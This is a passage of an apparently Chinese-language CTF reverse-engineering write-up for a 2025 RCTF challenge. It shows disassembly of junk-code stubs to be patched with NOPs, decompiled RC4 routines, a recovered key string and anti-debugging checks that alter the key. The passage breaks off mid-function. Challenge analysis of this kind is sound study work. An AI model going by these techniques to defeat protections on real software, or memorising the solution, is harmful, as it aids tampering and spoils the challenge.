</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-SQL data-lang=SQL><span class=line><span class=cl><span class=p>.</span><span class=nb>text</span><span class=p>:</span><span class=mi>004014</span><span class=n>E3</span><span class=w> </span><span class=n>jnz</span><span class=w>     </span><span class=n>short</span><span class=w> </span><span class=n>near</span><span class=w> </span><span class=n>ptr</span><span class=w> </span><span class=n>loc_4014E5</span><span class=o>+</span><span class=mi>2</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=nb>text</span><span class=p>:</span><span class=mi>004014</span><span class=n>E5</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=nb>text</span><span class=p>:</span><span class=mi>004014</span><span class=n>E5</span><span class=w> </span><span class=n>loc_4014E5</span><span class=p>:</span><span class=w>                             </span><span class=p>;</span><span class=w> </span><span class=n>CODE</span><span class=w> </span><span class=n>XREF</span><span class=p>:</span><span class=w> </span><span class=p>.</span><span class=nb>text</span><span class=p>:</span><span class=mi>004014</span><span class=n>E3</span><span class=err>↑</span><span class=n>j</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=nb>text</span><span class=p>:</span><span class=mi>004014</span><span class=n>E5</span><span class=w>                 </span><span class=n>jmp</span><span class=w>     </span><span class=n>near</span><span class=w> </span><span class=n>ptr</span><span class=w> </span><span class=mi>40</span><span class=n>FDD7h</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=nb>text</span><span class=p>:</span><span class=mi>004014</span><span class=n>E5</span><span class=w> </span><span class=p>;</span><span class=w> </span><span class=c1>---------------------------------------------------------------------------
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>.</span><span class=nb>text</span><span class=p>:</span><span class=mi>004014</span><span class=n>EA</span><span class=w>                 </span><span class=n>align</span><span class=w> </span><span class=mi>4</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=nb>text</span><span class=p>:</span><span class=mi>004014</span><span class=n>EC</span><span class=w>                 </span><span class=n>pop</span><span class=w>     </span><span class=n>eax</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=nb>text</span><span class=p>:</span><span class=mi>004014</span><span class=n>ED</span><span class=w>                 </span><span class=n>mov</span><span class=w>     </span><span class=p>[</span><span class=n>ebp</span><span class=o>-</span><span class=mi>88</span><span class=n>h</span><span class=p>],</span><span class=w> </span><span class=n>eax</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=nb>text</span><span class=p>:</span><span class=mi>004014</span><span class=n>F3</span><span class=w>                 </span><span class=k>call</span><span class=w>    </span><span class=n>loc_4014FB</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=nb>text</span><span class=p>:</span><span class=mi>004014</span><span class=n>F3</span><span class=w> </span><span class=p>;</span><span class=w> </span><span class=c1>---------------------------------------------------------------------------
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>.</span><span class=nb>text</span><span class=p>:</span><span class=mi>004014</span><span class=n>F8</span><span class=w>                 </span><span class=n>db</span><span class=w> </span><span class=mi>0</span><span class=n>EAh</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=n>EBh</span><span class=p>,</span><span class=w> </span><span class=mi>9</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=nb>text</span><span class=p>:</span><span class=mi>004014</span><span class=n>FB</span><span class=w> </span><span class=p>;</span><span class=w> </span><span class=c1>---------------------------------------------------------------------------
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>.</span><span class=nb>text</span><span class=p>:</span><span class=mi>004014</span><span class=n>FB</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=nb>text</span><span class=p>:</span><span class=mi>004014</span><span class=n>FB</span><span class=w> </span><span class=n>loc_4014FB</span><span class=p>:</span><span class=w>                             </span><span class=p>;</span><span class=w> </span><span class=n>CODE</span><span class=w> </span><span class=n>XREF</span><span class=p>:</span><span class=w> </span><span class=p>.</span><span class=nb>text</span><span class=p>:</span><span class=mi>004014</span><span class=n>F3</span><span class=err>↑</span><span class=n>j</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=nb>text</span><span class=p>:</span><span class=mi>004014</span><span class=n>FB</span><span class=w>                 </span><span class=n>pop</span><span class=w>     </span><span class=n>ebx</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=nb>text</span><span class=p>:</span><span class=mi>004014</span><span class=n>FC</span><span class=w>                 </span><span class=n>inc</span><span class=w>     </span><span class=n>ebx</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=nb>text</span><span class=p>:</span><span class=mi>004014</span><span class=n>FD</span><span class=w>                 </span><span class=n>push</span><span class=w>    </span><span class=n>ebx</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=nb>text</span><span class=p>:</span><span class=mi>004014</span><span class=n>FE</span><span class=w>                 </span><span class=n>mov</span><span class=w>     </span><span class=n>eax</span><span class=p>,</span><span class=w> </span><span class=mi>11111111</span><span class=n>h</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=nb>text</span><span class=p>:</span><span class=mi>00401503</span><span class=w>                 </span><span class=n>retn</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=nb>text</span><span class=p>:</span><span class=mi>00401504</span><span class=w> </span><span class=p>;</span><span class=w> </span><span class=c1>---------------------------------------------------------------------------
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>.</span><span class=nb>text</span><span class=p>:</span><span class=mi>00401504</span><span class=w>                 </span><span class=k>call</span><span class=w>    </span><span class=n>sub_401510</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=nb>text</span><span class=p>:</span><span class=mi>00401509</span><span class=w>                 </span><span class=n>mov</span><span class=w>     </span><span class=n>ebx</span><span class=p>,</span><span class=w> </span><span class=mi>33333333</span><span class=n>h</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=nb>text</span><span class=p>:</span><span class=mi>0040150</span><span class=n>E</span><span class=w>                 </span><span class=n>jmp</span><span class=w>     </span><span class=n>short</span><span class=w> </span><span class=n>loc_40151D</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=nb>text</span><span class=p>:</span><span class=mi>00401510</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=nb>text</span><span class=p>:</span><span class=mi>00401510</span><span class=w> </span><span class=p>;</span><span class=w> </span><span class=o>===============</span><span class=w> </span><span class=n>S</span><span class=w> </span><span class=n>U</span><span class=w> </span><span class=n>B</span><span class=w> </span><span class=n>R</span><span class=w> </span><span class=n>O</span><span class=w> </span><span class=n>U</span><span class=w> </span><span class=n>T</span><span class=w> </span><span class=n>I</span><span class=w> </span><span class=n>N</span><span class=w> </span><span class=n>E</span><span class=w> </span><span class=o>=======================================</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=nb>text</span><span class=p>:</span><span class=mi>00401510</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=nb>text</span><span class=p>:</span><span class=mi>00401510</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=nb>text</span><span class=p>:</span><span class=mi>00401510</span><span class=w> </span><span class=n>sub_401510</span><span class=w>      </span><span class=n>proc</span><span class=w> </span><span class=n>near</span><span class=w>               </span><span class=p>;</span><span class=w> </span><span class=n>CODE</span><span class=w> </span><span class=n>XREF</span><span class=p>:</span><span class=w> </span><span class=p>.</span><span class=nb>text</span><span class=p>:</span><span class=mi>00401504</span><span class=err>↑</span><span class=n>p</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=nb>text</span><span class=p>:</span><span class=mi>00401510</span><span class=w>                 </span><span class=n>mov</span><span class=w>     </span><span class=n>ebx</span><span class=p>,</span><span class=w> </span><span class=mi>11111111</span><span class=n>h</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=nb>text</span><span class=p>:</span><span class=mi>00401515</span><span class=w>                 </span><span class=n>pop</span><span class=w>     </span><span class=n>ebx</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=nb>text</span><span class=p>:</span><span class=mi>00401516</span><span class=w>                 </span><span class=n>mov</span><span class=w>     </span><span class=n>ebx</span><span class=p>,</span><span class=w> </span><span class=k>offset</span><span class=w> </span><span class=n>loc_40151D</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=nb>text</span><span class=p>:</span><span class=mi>0040151</span><span class=n>B</span><span class=w>                 </span><span class=n>push</span><span class=w>    </span><span class=n>ebx</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=nb>text</span><span class=p>:</span><span class=mi>0040151</span><span class=k>C</span><span class=w>                 </span><span class=n>retn</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=nb>text</span><span class=p>:</span><span class=mi>0040151</span><span class=k>C</span><span class=w> </span><span class=n>sub_401510</span><span class=w>      </span><span class=n>endp</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=nb>text</span><span class=p>:</span><span class=mi>0040151</span><span class=k>C</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=nb>text</span><span class=p>:</span><span class=mi>0040151</span><span class=n>D</span><span class=w> </span><span class=p>;</span><span class=w> </span><span class=c1>---------------------------------------------------------------------------
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>.</span><span class=nb>text</span><span class=p>:</span><span class=mi>0040151</span><span class=n>D</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=nb>text</span><span class=p>:</span><span class=mi>0040151</span><span class=n>D</span><span class=w> </span><span class=n>loc_40151D</span><span class=p>:</span><span class=w>                             </span><span class=p>;</span><span class=w> </span><span class=n>CODE</span><span class=w> </span><span class=n>XREF</span><span class=p>:</span><span class=w> </span><span class=p>.</span><span class=nb>text</span><span class=p>:</span><span class=mi>0040150</span><span class=n>E</span><span class=err>↑</span><span class=n>j</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=nb>text</span><span class=p>:</span><span class=mi>0040151</span><span class=n>D</span><span class=w>                                         </span><span class=p>;</span><span class=w> </span><span class=k>DATA</span><span class=w> </span><span class=n>XREF</span><span class=p>:</span><span class=w> </span><span class=n>sub_401510</span><span class=o>+</span><span class=mi>6</span><span class=err>↑</span><span class=n>o</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=nb>text</span><span class=p>:</span><span class=mi>0040151</span><span class=n>D</span><span class=w>                 </span><span class=n>mov</span><span class=w>     </span><span class=n>ebx</span><span class=p>,</span><span class=w> </span><span class=mi>22222222</span><span class=n>h</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>全nop即可</p><p>加密算法是rc4</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=line><span class=cl><span class=kt>char</span> <span class=kr>__cdecl</span> <span class=nf>sub_4017D0</span><span class=p>(</span><span class=n>_BYTE</span> <span class=o>*</span><span class=n>a1</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=n>a2</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>n128</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>result</span><span class=p>;</span> <span class=c1>// al
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>char</span> <span class=n>v4</span><span class=p>;</span> <span class=c1>// [esp+0h] [ebp-10h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v5</span><span class=p>;</span> <span class=c1>// [esp+4h] [ebp-Ch]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v6</span><span class=p>;</span> <span class=c1>// [esp+8h] [ebp-8h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>n0x100</span><span class=p>;</span> <span class=c1>// [esp+Ch] [ebp-4h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>n0x100_1</span><span class=p>;</span> <span class=c1>// [esp+Ch] [ebp-4h]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>v5</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>LOBYTE</span><span class=p>(</span><span class=n>v6</span><span class=p>)</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>result</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span><span class=p>)</span><span class=n>a1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>a1</span><span class=p>[</span><span class=mi>257</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>a1</span><span class=p>[</span><span class=mi>256</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>for</span> <span class=p>(</span> <span class=n>n0x100</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>n0x100</span> <span class=o>&lt;</span> <span class=mh>0x100</span><span class=p>;</span> <span class=o>++</span><span class=n>n0x100</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>result</span> <span class=o>=</span> <span class=n>n0x100</span> <span class=o>+</span> <span class=p>(</span><span class=n>_BYTE</span><span class=p>)</span><span class=n>a1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>a1</span><span class=p>[</span><span class=n>n0x100</span><span class=p>]</span> <span class=o>=</span> <span class=n>n0x100</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>for</span> <span class=p>(</span> <span class=n>n0x100_1</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>n0x100_1</span> <span class=o>&lt;</span> <span class=mh>0x100</span><span class=p>;</span> <span class=o>++</span><span class=n>n0x100_1</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>v4</span> <span class=o>=</span> <span class=n>a1</span><span class=p>[</span><span class=n>n0x100_1</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=n>v6</span> <span class=o>=</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kr>__int8</span><span class=p>)(</span><span class=n>v6</span> <span class=o>+</span> <span class=n>v4</span> <span class=o>+</span> <span class=n>a2</span><span class=p>[</span><span class=n>v5</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=n>a1</span><span class=p>[</span><span class=n>n0x100_1</span><span class=p>]</span> <span class=o>=</span> <span class=n>a1</span><span class=p>[(</span><span class=kt>unsigned</span> <span class=kr>__int8</span><span class=p>)</span><span class=n>v6</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=n>result</span> <span class=o>=</span> <span class=n>v4</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>a1</span><span class=p>[</span><span class=n>v6</span><span class=p>]</span> <span class=o>=</span> <span class=n>v4</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=o>++</span><span class=n>v5</span> <span class=o>&gt;=</span> <span class=n>n128</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=n>v5</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>result</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=kt>char</span> <span class=kr>__cdecl</span> <span class=nf>sub_4018A0</span><span class=p>(</span><span class=n>_BYTE</span> <span class=o>*</span><span class=n>a1</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=n>a2</span><span class=p>,</span> <span class=kt>int</span> <span class=n>n128</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>result</span><span class=p>;</span> <span class=c1>// al
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>char</span> <span class=n>v5</span><span class=p>;</span> <span class=c1>// [esp+4h] [ebp-14h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>char</span> <span class=n>v6</span><span class=p>;</span> <span class=c1>// [esp+8h] [ebp-10h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v7</span><span class=p>;</span> <span class=c1>// [esp+Ch] [ebp-Ch]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v8</span><span class=p>;</span> <span class=c1>// [esp+10h] [ebp-8h]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>LOBYTE</span><span class=p>(</span><span class=n>v8</span><span class=p>)</span> <span class=o>=</span> <span class=n>a1</span><span class=p>[</span><span class=mi>256</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=n>LOBYTE</span><span class=p>(</span><span class=n>v7</span><span class=p>)</span> <span class=o>=</span> <span class=n>a1</span><span class=p>[</span><span class=mi>257</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=k>while</span> <span class=p>(</span> <span class=n>n128</span><span class=o>--</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>v8</span> <span class=o>=</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kr>__int8</span><span class=p>)(</span><span class=n>v8</span> <span class=o>+</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>v6</span> <span class=o>=</span> <span class=n>a1</span><span class=p>[</span><span class=n>v8</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=n>v7</span> <span class=o>=</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kr>__int8</span><span class=p>)(</span><span class=n>v6</span> <span class=o>+</span> <span class=n>v7</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>v5</span> <span class=o>=</span> <span class=n>a1</span><span class=p>[</span><span class=n>v7</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=n>a1</span><span class=p>[</span><span class=n>v8</span><span class=p>]</span> <span class=o>=</span> <span class=n>v5</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>a1</span><span class=p>[</span><span class=n>v7</span><span class=p>]</span> <span class=o>=</span> <span class=n>v6</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=n>a2</span><span class=o>++</span> <span class=o>^=</span> <span class=n>a1</span><span class=p>[(</span><span class=kt>unsigned</span> <span class=kr>__int8</span><span class=p>)(</span><span class=n>v5</span> <span class=o>+</span> <span class=n>v6</span><span class=p>)];</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=n>a1</span><span class=p>[</span><span class=mi>256</span><span class=p>]</span> <span class=o>=</span> <span class=n>v8</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>result</span> <span class=o>=</span> <span class=n>v7</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>a1</span><span class=p>[</span><span class=mi>257</span><span class=p>]</span> <span class=o>=</span> <span class=n>v7</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>result</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>调试起来发现key是flag:{Th1sflaglsGo0ds}</p><p><img src=/img/2025-RCTF/74.png alt=img></p><p>尝试解密发现有问题，然后注意到几处反调试</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=line><span class=cl><span class=kt>int</span> <span class=nf>sub_A81090</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>v1</span><span class=p>;</span> <span class=c1>// [esp+Ch] [ebp-Ch]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>uint8_t</span> <span class=n>BeingDebugged</span><span class=p>;</span> <span class=c1>// [esp+13h] [ebp-5h]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>BeingDebugged</span> <span class=o>=</span> <span class=n>NtCurrentPeb</span><span class=p>()</span><span class=o>-&gt;</span><span class=n>BeingDebugged</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>sub_A81440</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=n>n8</span> <span class=o>=</span> <span class=mi>8</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=o>!</span><span class=n>BeingDebugged</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=p>(</span><span class=n>_BYTE</span> <span class=o>*</span><span class=p>)(</span><span class=n>n8</span> <span class=o>+</span> <span class=n>dword_A8440C</span><span class=p>)</span> <span class=o>=</span> <span class=sc>&#39;i&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>v1</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=kr>__cdecl</span> <span class=nf>sub_A81200</span><span class=p>(</span><span class=kt>int</span> <span class=p>(</span><span class=kr>__stdcall</span> <span class=o>*</span><span class=n>a1</span><span class=p>)(</span><span class=n>HANDLE</span><span class=p>,</span> <span class=kt>int</span><span class=p>,</span> <span class=kt>int</span> <span class=o>*</span><span class=p>,</span> <span class=kt>int</span><span class=p>,</span> <span class=n>_DWORD</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>result</span><span class=p>;</span> <span class=c1>// eax
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>HANDLE</span> <span class=n>CurrentProcess</span><span class=p>;</span> <span class=c1>// [esp+Ch] [ebp-10h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v3</span><span class=p>;</span> <span class=c1>// [esp+14h] [ebp-8h] BYREF
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>CurrentProcess</span> <span class=o>=</span> <span class=n>GetCurrentProcess</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=n>result</span> <span class=o>=</span> <span class=n>a1</span><span class=p>(</span><span class=n>CurrentProcess</span><span class=p>,</span> <span class=mi>7</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>v3</span><span class=p>,</span> <span class=mi>4</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>n8</span> <span class=o>=</span> <span class=mi>14</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=o>!</span><span class=n>v3</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=p>(</span><span class=n>_BYTE</span> <span class=o>*</span><span class=p>)(</span><span class=n>n8</span> <span class=o>+</span> <span class=n>dword_A8440C</span><span class=p>)</span> <span class=o>=</span> <span class=sc>&#39;I&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>result</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=kr>__cdecl</span> <span class=nf>sub_A813A0</span><span class=p>(</span><span class=kt>int</span> <span class=p>(</span><span class=kr>__stdcall</span> <span class=o>*</span><span class=n>a1</span><span class=p>)(</span><span class=n>HANDLE</span><span class=p>,</span> <span class=kt>int</span><span class=p>,</span> <span class=kt>int</span> <span class=o>*</span><span class=p>,</span> <span class=kt>int</span><span class=p>,</span> <span class=n>_DWORD</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>result</span><span class=p>;</span> <span class=c1>// eax
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>HANDLE</span> <span class=n>CurrentProcess</span><span class=p>;</span> <span class=c1>// [esp+Ch] [ebp-10h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v3</span><span class=p>;</span> <span class=c1>// [esp+14h] [ebp-8h] BYREF
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>CurrentProcess</span> <span class=o>=</span> <span class=n>GetCurrentProcess</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=n>result</span> <span class=o>=</span> <span class=n>a1</span><span class=p>(</span><span class=n>CurrentProcess</span><span class=p>,</span> <span class=mi>31</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>v3</span><span class=p>,</span> <span class=mi>4</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>n8</span> <span class=o>=</span> <span class=mi>18</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>v3</span> <span class=o>==</span> <span class=mi>1</span> <span class=p>)</span>
